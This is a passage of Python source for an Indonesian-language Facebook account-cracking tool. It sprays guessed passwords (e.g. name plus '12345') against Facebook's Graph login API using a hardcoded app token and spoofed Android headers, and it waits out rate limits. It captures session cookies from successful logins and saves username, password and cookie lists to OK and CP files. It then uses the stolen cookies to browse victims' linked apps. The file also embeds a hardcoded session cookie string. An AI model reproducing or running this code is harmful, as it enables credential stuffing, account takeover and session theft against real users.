								pwx.append(belakang+"12345")
						fall.submit(self.metode_api,user,pwx)
					except:
						fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.cp)}{P2} CP : {K2}{len(self.ok)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
							
	
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}➢{P2} B-Api [{H2}LeonzzXD{P2}] {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.cp)}{P2} CP : {K2}{len(self.ok)}{P2}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				ua = random.choice(ugent)
				params = {
					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
					"sdk_version": f"{str(random.randint(1,26))}", 
					"email": email,
					"locale": "en_US",
					"password": pw,
					"sdk": "android",
					"generate_session_cookies": "1",
					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
				headers = {
					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": ua,
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger"
				}
				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
				if "session_key" in post.text and "EAA" in post.text:
					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
					sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					user = re.findall("c_user=(\d+)",cookie)[0]
					if user in self.ok or user in self.cp:
						break
					else:
						self.ok.append(user)
						if "muncul" in self.apk:
							self.get_apk(user,pw,cookie)
						else:
							tree = Tree(Panel.fit(f"""{H2}➢ Nama     : {user}\n➢ Password : {pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
							tree.add(Panel(f"{H2}➢ {cookie}{P2}",style=f"{color_panel}"))
							prints(tree)
						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
						break
				elif "User must verify their account" in post.text:
					user = post.json()["error"]["error_data"]["uid"]
					if user in self.ok or user in self.cp:
						break
					else:
						self.cp.append(user)
						tree = Tree(Panel.fit(f"""{H2}➢ Nama     : {user}\n➢ Password : {pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
						tree.add(Panel(f"{H2}➢ sb=GbgOCz_nd5BT-SA7r4w7iLWk;c_user=100042305053061;xs=26:lgg898NcLG2-cg:2:1698660727:-1:10720;fr=0imlL9YyVsEoN1o2Q.AWXapOtnRdB-jKpKnOhYAhgBheE.BlP4F3.bN.AAA.0.0.BlP4F3.AWVHO5qBWPU;datr=d4E_ZVWfKgwV0iP4Ls5ac9vv{P2}",style=f"{color_panel}"))
						prints(tree)
						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
						break
				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
					prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
					prog.advance(des)
					time.sleep(30)
				else:continue
		except ConnectionError:
			time.sleep(30)
			self.metode_api(user,pwx)
		self.loop +=1

	
	def simpan_hasil(self):
		prints(Panel(f"""{H2}➢ •{H2}OK/{self.hari_ini}.txt\n{H2}➢ •{K2}CP/{self.hari_ini}.txt""",width=70,padding=(0,10),style=f"{color_panel}"))
	
	def get_apk(self,user,pw,cookie):
		
		
		try:
			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
						parsing = parser(get.text,"html.parser")
						action = parsing.find("form",{"method":"post"})["action"]
						data = {
							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
							"submit": "OK, Gunakan Data"
						}
						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
						break
		except:pass
			
		
		aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
		self.apkaktif("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookie)
		if len(self.aktif)==0:
			aktip.add(f"{P2}tidak ada aplikasi yang terkait")
		else:
			for apk in self.aktif:
				aktip.add(f"{H2}{apk}{P2}")
				
		
		kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
		self.apkkadaluwarsa("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookie)
		if len(self.kadaluwarsa)==0:
			kadalu.add(f"{P2}tidak ada aplikasi yang terkait")
		else:
			for apk in self.kadaluwarsa:
				kadalu.add(f"{M2}{apk}{P2}")
			
		
		tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
		tree.add(aktip)
		tree.add(kadalu)
		tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
		prints(tree)
		
	
	def apkaktif(self,url,cookie):
		try:
			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Ditambahkan" in apk.text:
					self.aktif.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
				else:continue
			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.apkaktif(next,cookie)
		except:pass
		
	
	def apkkadaluwarsa(self,url,cookie):
		try:
			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Kedaluwarsa" in apk.text:
					self.kadaluwarsa.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
				else:continue
			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.apkkadaluwarsa(next,cookie)
		except:pass
	

class Lain:
	
	
	def __init__(self,cookie):
		self.cookie = cookie
		self.file = []
		self.listfile = []
		
	
	def menu(self):
		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack  [{color_text}04{P2}]. ganti warna tema tools
[{color_text}02{P2}]. get info akun target    [{color_text}05{P2}]. tampilkan info cookies
[{color_text}03{P2}]. setting user agent      [{color_text}06{P2}]. logout ({M2}hapus login{P2})""",width=80,padding=(0,7),style=f"{color_panel}"))
		menu = console.input(f" {H2}• {P2}pilih menu : ")
		if menu in["01","1"]:
			self.cek_hasil()
		elif menu in["04","4"]:
			self.ganti_tema()
		elif menu in["05","5"]:
			self.tampil_cookie()
		elif menu in["06","6"]:
			os.system("rm data/cookie")
			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python run.py""",width=80,style=f"{color_panel}")))
		else:
			exit(prints(Panel(f"""{M2}sorry belum gua update""",width=80,style=f"{color_panel}")))

	
	def cek_hasil(self):
		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack ok
[{color_text}02{P2}]. lihat akun hasil crack cp""",width=80,padding=(0,20),style=f"{color_panel}"))
		ask = console.input(f" {H2}• {P2}masukan pilihan : ")
		if ask in["1","01"]:folder = "OK"
		else:folder = "CP"
		
		
		dirs = os.listdir(folder)
		prints(Panel(f"""{P2} berhasil menemukan {len(dirs)} file hasil crack ok""",width=80,padding=(0,15),style=f"{color_panel}"))
		num = 0
		for fil in dirs:
			num += 1
			self.file.append(fil)
			totalakun = open(f"{folder}/{fil}","r").read().splitlines()
			self.listfile.append(Panel(f"{P2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_panel}"))
			self.listfile.append(Panel(f"{P2}{fil}",width=35,title=f"{P2}tanggal",style=f"{color_panel}"))
			self.listfile.append(Panel(f"{P2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=f"{color_panel}"))
		console.print(Columns(self.listfile))
		prints(Panel(f"""{P2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=80,style=f"{color_panel}"))
		result = console.input(f" {H2}• {P2}masukan angka : ")
		
		
		try:
			files = self.file[int(result)-1]
			totalhasil = open(f"{folder}/{files}","r").read().splitlines()
		except:
			prints(Panel(f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",width=80,style=f"{color_panel}"))
			exit()
		nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
		prints(Panel(f"""{P2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",width=80,style=f"{color_panel}"))
		for akun in totalhasil:
			user = akun.split("|")[0]
			pw = akun.split("|")[1]
			tree = Tree(" ",guide_style=f"{color_panel}")
			if folder=="OK":
				cookie = akun.split("|")[2]
				tree.add(f"\r{H2}{user}|{pw}{P2} ")
				tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
			else:
				tree.add(f"\r{K2}{user}|{pw}{P2} ")
			prints(tree)
		prints(Panel(f"""{P2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",width=80,padding=(0,7),style=f"{color_panel}"))
		exit()
		
	
	def ganti_tema(self):
		prints(Panel(f"""{P2}[{color_text}01{P2}]. ganti warna tema merah  [{color_text}06{P2}]. ganti warna tema pink
[{color_text}02{P2}]. ganti warna tema hijau  [{color_text}07{P2}]. ganti warna tema cyan
[{color_text}03{P2}]. ganti warna tema kuning [{color_text}08{P2}]. ganti warna tema putih
[{color_text}04{P2}]. ganti warna tema biru   [{color_text}09{P2}]. ganti warna tema orange
[{color_text}05{P2}]. ganti warna tema ungu   [{color_text}10{P2}]. ganti warna tema abu2""",width=80,padding=(0,7),style=f"{color_panel}"))
		ask = console.input(f" {H2}• {P2}pilih tema : ")
		if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
		elif ask in["02","2"]:warna = "[#00FF00]";teks="hijau"
		elif ask in["03","3"]:warna = "[#FFFF00]";teks="kuning"
		elif ask in["04","4"]:warna = "[#00C8FF]";teks="biru"
		elif ask in["05","5"]:warna = "[#AF00FF]";teks="ungu"
		elif ask in["06","6"]:warna = "[#FF00FF]";teks="pink"
		elif ask in["07","7"]:warna = "[#00FFFF]";teks="cyan"
		elif ask in["08","8"]:warna = "[#FFFFFF]";teks="putih"
		elif ask in["09","9"]:warna = "[#FF8F00]";teks="orange"
		elif ask in["10"]:warna = "[#AAAAAA]";teks="abu-abu"
		open("data/theme_color","w").write(warna+"|"+warna.replace("[","").replace("]",""))
		prints(Panel(f"""{H2}berhasil mengganti tema ke {teks}, silahkan mulai ulang tools""",width=80,padding=(0,6),style=f"{color_panel}"))
		sys.exit()
			
	
	def tampil_cookie(self):
		now = datetime.now()
		hari = now.day+int(30)
		if hari > 30:hari = hari-30
		bulan = now.month+1
		if bulan > 12:bulan = bulan-12
		if now.month+1 > 12:tahun = now.year+1
		data = date(year=tahun,month=bulan,day=hari)
		aktif = data.strftime("%d %B %Y")
		console.print(f" {H2}• {P2}aktif sampai : {aktif}")
		prints(Panel(f"""{H2}{self.cookie.get('cookie')}""",width=80,style=f"{color_panel}"))
		sys.exit()
		

class Session:
	
	
	def generate_ugent(self):
		#versi_android = random.randint(4,12)
		#versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
		#versi_app = random.randint(410000000,499999999)
		#device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
		#density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
		ugent = f"Davik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
		return ugent		
		
if __name__=="__main__":
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("data")
	except:pass
	Menu().menu()
